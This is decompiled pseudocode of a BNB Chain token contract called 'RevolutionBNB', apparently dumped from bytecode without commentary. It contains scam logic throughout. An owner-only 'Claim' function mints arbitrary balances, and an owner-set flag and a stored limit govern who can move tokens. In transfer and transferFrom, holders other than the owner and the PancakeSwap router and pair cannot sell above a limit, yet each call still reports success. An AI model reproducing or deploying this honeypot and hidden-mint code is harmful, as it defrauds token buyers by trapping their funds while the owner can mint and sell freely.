contract main {




// =====================  Runtime code  =====================


const name = 'RevolutionBNB', 0

const decimals = 9

const tokenContract = address(this.address)

const symbol = 'REVOBNB', 0

const pancakePair = ext_call.return_data[12 len 20]


address owner;
uint256 stor1;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
uint8 stor5;

function totalSupply() payable {
    return totalSupply
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function owner() payable {
    return owner
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function theNumber(bool arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor5 = uint8(arg1)
    return 1
}

function Claim(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if balanceOf[address(msg.sender)] > -arg1 - 1:
        revert with 'NH{q', 17
    balanceOf[address(msg.sender)] += arg1
    return 1
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if allowance[address(msg.sender)][address(arg1)] > -arg2 - 1:
        revert with 'NH{q', 17
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if allowance[address(msg.sender)][address(arg1)] < arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: decreased allowance below zero'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if msg.sender == 0x10ed43c718714eb63d5aa57b78b54704e256024e:
        if not msg.sender:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
        if balanceOf[address(msg.sender)] < arg2:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
        balanceOf[address(msg.sender)] -= arg2
        if balanceOf[address(arg1)] > -arg2 - 1:
            revert with 'NH{q', 17
        balanceOf[address(arg1)] += arg2
        emit Transfer(arg2, msg.sender, arg1);
    else:
        require ext_code.size(0xca143ce32fe78f1f7019d7d551a6402fc5350c73)
        staticcall 0xca143ce32fe78f1f7019d7d551a6402fc5350c73.getPair(address arg1, address arg2) with:
                gas gas_remaining wei
               args 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c, this.address
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
        if msg.sender == ext_call.return_data[12 len 20]:
            if not msg.sender:
                revert with 0, 'ERC20: transfer from the zero address'
            if not arg1:
                revert with 0, 'ERC20: transfer to the zero address'
            if balanceOf[address(msg.sender)] < arg2:
                revert with 0, 'ERC20: transfer amount exceeds balance'
            balanceOf[address(msg.sender)] -= arg2
            if balanceOf[address(arg1)] > -arg2 - 1:
                revert with 'NH{q', 17
            balanceOf[address(arg1)] += arg2
            emit Transfer(arg2, msg.sender, arg1);
        else:
            require ext_code.size(0xca143ce32fe78f1f7019d7d551a6402fc5350c73)
            staticcall 0xca143ce32fe78f1f7019d7d551a6402fc5350c73.getPair(address arg1, address arg2) with:
                    gas gas_remaining wei
                   args 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c, this.address
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
            if not ext_call.return_data[12 len 20]:
                if not msg.sender:
                    revert with 0, 'ERC20: transfer from the zero address'
                if not arg1:
                    revert with 0, 'ERC20: transfer to the zero address'
                if balanceOf[address(msg.sender)] < arg2:
                    revert with 0, 'ERC20: transfer amount exceeds balance'
                balanceOf[address(msg.sender)] -= arg2
                if balanceOf[address(arg1)] > -arg2 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)] += arg2
                emit Transfer(arg2, msg.sender, arg1);
            else:
                if msg.sender == owner:
                    if not msg.sender:
                        revert with 0, 'ERC20: transfer from the zero address'
                    if not arg1:
                        revert with 0, 'ERC20: transfer to the zero address'
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 0, 'ERC20: transfer amount exceeds balance'
                    balanceOf[address(msg.sender)] -= arg2
                    if balanceOf[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if arg2 <= stor1:
                        if not ext_code.hash(msg.sender):
                            if not msg.sender:
                                revert with 0, 'ERC20: transfer from the zero address'
                            if not arg1:
                                revert with 0, 'ERC20: transfer to the zero address'
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 'ERC20: transfer amount exceeds balance'
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if ext_code.hash(msg.sender) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                                if not msg.sender:
                                    revert with 0, 'ERC20: transfer from the zero address'
                                if not arg1:
                                    revert with 0, 'ERC20: transfer to the zero address'
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 'ERC20: transfer amount exceeds balance'
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if stor5:
                            if not ext_code.hash(msg.sender):
                                if not msg.sender:
                                    revert with 0, 'ERC20: transfer from the zero address'
                                if not arg1:
                                    revert with 0, 'ERC20: transfer to the zero address'
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 'ERC20: transfer amount exceeds balance'
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if ext_code.hash(msg.sender) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                                    if not msg.sender:
                                        revert with 0, 'ERC20: transfer from the zero address'
                                    if not arg1:
                                        revert with 0, 'ERC20: transfer to the zero address'
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 'ERC20: transfer amount exceeds balance'
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    if arg1 == 0x10ed43c718714eb63d5aa57b78b54704e256024e:
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
        if not arg2:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
        if balanceOf[address(arg1)] < arg3:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
        balanceOf[address(arg1)] -= arg3
        if balanceOf[address(arg2)] > -arg3 - 1:
            revert with 'NH{q', 17
        balanceOf[address(arg2)] += arg3
        emit Transfer(arg3, arg1, arg2);
        if allowance[address(arg1)][address(msg.sender)] < arg3:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
        if not msg.sender:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
        allowance[address(arg1)][address(msg.sender)] -= arg3
        emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    else:
        require ext_code.size(0xca143ce32fe78f1f7019d7d551a6402fc5350c73)
        staticcall 0xca143ce32fe78f1f7019d7d551a6402fc5350c73.getPair(address arg1, address arg2) with:
                gas gas_remaining wei
               args 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c, this.address
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
        if arg1 == ext_call.return_data[12 len 20]:
            if not arg1:
                revert with 0, 'ERC20: transfer from the zero address'
            if not arg2:
                revert with 0, 'ERC20: transfer to the zero address'
            if balanceOf[address(arg1)] < arg3:
                revert with 0, 'ERC20: transfer amount exceeds balance'
            balanceOf[address(arg1)] -= arg3
            if balanceOf[address(arg2)] > -arg3 - 1:
                revert with 'NH{q', 17
            balanceOf[address(arg2)] += arg3
            emit Transfer(arg3, arg1, arg2);
            if allowance[address(arg1)][address(msg.sender)] < arg3:
                revert with 0, 'ERC20: transfer amount exceeds allowance'
            if not arg1:
                revert with 0, 'ERC20: approve from the zero address'
            if not msg.sender:
                revert with 0, 'ERC20: approve to the zero address'
            allowance[address(arg1)][address(msg.sender)] -= arg3
            emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
        else:
            require ext_code.size(0xca143ce32fe78f1f7019d7d551a6402fc5350c73)
            staticcall 0xca143ce32fe78f1f7019d7d551a6402fc5350c73.getPair(address arg1, address arg2) with:
                    gas gas_remaining wei
                   args 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c, this.address
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
            if not ext_call.return_data[12 len 20]:
                if not arg1:
                    revert with 0, 'ERC20: transfer from the zero address'
                if not arg2:
                    revert with 0, 'ERC20: transfer to the zero address'
                if balanceOf[address(arg1)] < arg3:
                    revert with 0, 'ERC20: transfer amount exceeds balance'
                balanceOf[address(arg1)] -= arg3
                if balanceOf[address(arg2)] > -arg3 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg2)] += arg3
                emit Transfer(arg3, arg1, arg2);
                if allowance[address(arg1)][address(msg.sender)] < arg3:
                    revert with 0, 'ERC20: transfer amount exceeds allowance'
                if not arg1:
                    revert with 0, 'ERC20: approve from the zero address'
                if not msg.sender:
                    revert with 0, 'ERC20: approve to the zero address'
                allowance[address(arg1)][address(msg.sender)] -= arg3
                emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
            else:
                if arg1 == owner:
                    if not arg1:
                        revert with 0, 'ERC20: transfer from the zero address'
                    if not arg2:
                        revert with 0, 'ERC20: transfer to the zero address'
                    if balanceOf[address(arg1)] < arg3:
                        revert with 0, 'ERC20: transfer amount exceeds balance'
                    balanceOf[address(arg1)] -= arg3
                    if balanceOf[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                    if allowance[address(arg1)][address(msg.sender)] < arg3:
                        revert with 0, 'ERC20: transfer amount exceeds allowance'
                    if not arg1:
                        revert with 0, 'ERC20: approve from the zero address'
                    if not msg.sender:
                        revert with 0, 'ERC20: approve to the zero address'
                    allowance[address(arg1)][address(msg.sender)] -= arg3
                    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
                else:
                    if arg3 <= stor1:
                        if not ext_code.hash(arg1):
                            if not arg1:
                                revert with 0, 'ERC20: transfer from the zero address'
                            if not arg2:
                                revert with 0, 'ERC20: transfer to the zero address'
                            if balanceOf[address(arg1)] < arg3:
                                revert with 0, 'ERC20: transfer amount exceeds balance'
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                            if allowance[address(arg1)][address(msg.sender)] < arg3:
                                revert with 0, 'ERC20: transfer amount exceeds allowance'
                            if not arg1:
                                revert with 0, 'ERC20: approve from the zero address'
                            if not msg.sender:
                                revert with 0, 'ERC20: approve to the zero address'
                            allowance[address(arg1)][address(msg.sender)] -= arg3
                            emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
                        else:
                            if ext_code.hash(arg1) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                                if not arg1:
                                    revert with 0, 'ERC20: transfer from the zero address'
                                if not arg2:
                                    revert with 0, 'ERC20: transfer to the zero address'
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 0, 'ERC20: transfer amount exceeds balance'
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                                if allowance[address(arg1)][address(msg.sender)] < arg3:
                                    revert with 0, 'ERC20: transfer amount exceeds allowance'
                                if not arg1:
                                    revert with 0, 'ERC20: approve from the zero address'
                                if not msg.sender:
                                    revert with 0, 'ERC20: approve to the zero address'
                                allowance[address(arg1)][address(msg.sender)] -= arg3
                                emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
                    else:
                        if stor5:
                            if not ext_code.hash(arg1):
                                if not arg1:
                                    revert with 0, 'ERC20: transfer from the zero address'
                                if not arg2:
                                    revert with 0, 'ERC20: transfer to the zero address'
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 0, 'ERC20: transfer amount exceeds balance'
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                                if allowance[address(arg1)][address(msg.sender)] < arg3:
                                    revert with 0, 'ERC20: transfer amount exceeds allowance'
                                if not arg1:
                                    revert with 0, 'ERC20: approve from the zero address'
                                if not msg.sender:
                                    revert with 0, 'ERC20: approve to the zero address'
                                allowance[address(arg1)][address(msg.sender)] -= arg3
                                emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
                            else:
                                if ext_code.hash(arg1) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                                    if not arg1:
                                        revert with 0, 'ERC20: transfer from the zero address'
                                    if not arg2:
                                        revert with 0, 'ERC20: transfer to the zero address'
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 0, 'ERC20: transfer amount exceeds balance'
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[address(arg2)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] += arg3
                                    emit Transfer(arg3, arg1, arg2);
                                    if allowance[address(arg1)][address(msg.sender)] < arg3:
                                        revert with 0, 'ERC20: transfer amount exceeds allowance'
                                    if not arg1:
                                        revert with 0, 'ERC20: approve from the zero address'
                                    if not msg.sender:
                                        revert with 0, 'ERC20: approve to the zero address'
                                    allowance[address(arg1)][address(msg.sender)] -= arg3
                                    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
